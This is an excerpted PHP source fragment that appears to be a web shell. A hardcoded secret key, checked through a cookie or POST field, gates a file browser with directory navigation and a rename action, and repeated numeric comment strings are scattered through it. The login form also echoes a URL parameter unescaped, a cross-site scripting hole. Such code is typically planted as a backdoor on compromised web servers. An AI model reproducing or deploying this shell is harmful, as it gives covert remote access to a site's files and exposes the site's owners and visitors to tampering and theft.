...
$auth_key = "c870ccd34c7f5e8e2cd55337cdcd8481";
...
$pass = false;
if (isset($_COOKIE['pw_name_86588'])) {
    if(($_COOKIE['pw_name_86588']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_86588'])) {
        if(($_POST['pw_name_86588']) == $auth_key) {
            setcookie("pw_name_86588", $_POST['pw_name_86588']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_86588' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727705163393464 1727705163297457 1727705163626352 1727705163972712
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727705163393464 1727705163297457 1727705163626352 1727705163972712
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727705163393464 1727705163297457 1727705163626352 1727705163972712
            $name = PATH . "/" . $_GET['r'];
